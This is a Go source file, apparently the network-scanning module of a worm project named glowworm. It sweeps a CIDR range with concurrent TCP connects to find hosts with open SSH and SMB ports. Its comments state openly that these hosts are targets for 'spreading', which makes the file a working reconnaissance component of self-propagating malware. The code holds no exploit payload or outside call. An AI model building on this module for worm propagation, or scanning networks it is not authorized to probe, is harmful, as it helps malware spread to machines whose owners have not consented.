/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/glowworm
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

// Package scanner provides network scanning functionality.
//
// It discovers live hosts and identifies services (SSH, SMB) that
// can be used for spreading. The scanner uses TCP connect scans
// to identify open ports.
package scanner

import (
	"fmt"
	"net"
	"sync"
	"time"
)

// DefaultPorts are the ports we scan for spreading vectors.
var DefaultPorts = []int{
	22,  // SSH
	445, // SMB
}

// Host represents a discovered host with open ports.
type Host struct {
	// IP address of the host
	IP string

	// OpenPorts contains the ports that are open on this host
	OpenPorts []int

	// Services maps port numbers to detected service names
	Services map[int]string
}

// Scanner performs network reconnaissance.
//
// It scans IP ranges for hosts with services that can be
// exploited for spreading (SSH, SMB, etc.)
type Scanner struct {
	// TargetRange is the CIDR range to scan (e.g., "192.168.1.0/24")
	TargetRange string

	// Ports to scan on each host
	Ports []int

	// Timeout for connection attempts
	Timeout time.Duration

	// MaxConcurrent limits simultaneous connection attempts
	MaxConcurrent int
}

// NewScanner creates a scanner with default settings.
//
// Default configuration:
//   - Timeout: 2 seconds
//   - Ports: 22 (SSH), 445 (SMB)
//   - MaxConcurrent: 100
func NewScanner(targetRange string) *Scanner {
	return &Scanner{
		TargetRange:   targetRange,
		Ports:         DefaultPorts,
		Timeout:       2 * time.Second,
		MaxConcurrent: 100,
	}
}

// Scan performs the network scan and returns discovered hosts.
//
// It expands the CIDR range into individual IPs, then checks
// each IP for open ports concurrently.
func (s *Scanner) Scan() ([]Host, error) {
	// Parse the CIDR range
	ips, err := expandCIDR(s.TargetRange)
	if err != nil {
		return nil, fmt.Errorf("invalid CIDR range: %w", err)
	}

	// Channel for results
	results := make(chan Host, len(ips))

	// Semaphore for concurrency control
	sem := make(chan struct{}, s.MaxConcurrent)

	// WaitGroup to track completion
	var wg sync.WaitGroup

	// Scan each IP
	for _, ip := range ips {
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()

			// Acquire semaphore
			sem <- struct{}{}
			defer func() { <-sem }()

			// Scan this host
			host := s.scanHost(ip)
			if len(host.OpenPorts) > 0 {
				results <- host
			}
		}(ip)
	}

	// Close results channel when done
	go func() {
		wg.Wait()
		close(results)
	}()

	// Collect results
	var hosts []Host
	for host := range results {
		hosts = append(hosts, host)
	}

	return hosts, nil
}

// scanHost checks a single host for open ports.
func (s *Scanner) scanHost(ip string) Host {
	host := Host{
		IP:        ip,
		OpenPorts: []int{},
		Services:  make(map[int]string),
	}

	for _, port := range s.Ports {
		if s.isPortOpen(ip, port) {
			host.OpenPorts = append(host.OpenPorts, port)
			host.Services[port] = identifyService(port)
		}
	}

	return host
}

// isPortOpen checks if a TCP port is open on a host.
func (s *Scanner) isPortOpen(ip string, port int) bool {
	address := fmt.Sprintf("%s:%d", ip, port)

	conn, err := net.DialTimeout("tcp", address, s.Timeout)
	if err != nil {
		return false
	}

	conn.Close()
	return true
}

// identifyService returns the likely service for a port number.
func identifyService(port int) string {
	services := map[int]string{
		22:  "ssh",
		445: "smb",
		23:  "telnet",
		21:  "ftp",
	}

	if service, ok := services[port]; ok {
		return service
	}
	return "unknown"
}

// expandCIDR expands a CIDR range into individual IP addresses.
//
// For example, "192.168.1.0/30" returns:
// ["192.168.1.0", "192.168.1.1", "192.168.1.2", "192.168.1.3"]
func expandCIDR(cidr string) ([]string, error) {
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}

	var ips []string

	// Iterate through all IPs in the range
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); incrementIP(ip) {
		ips = append(ips, ip.String())
	}

	// Remove network and broadcast addresses for /24 and larger
	if len(ips) > 2 {
		ips = ips[1 : len(ips)-1]
	}

	return ips, nil
}

// incrementIP increments an IP address by one.
func incrementIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}
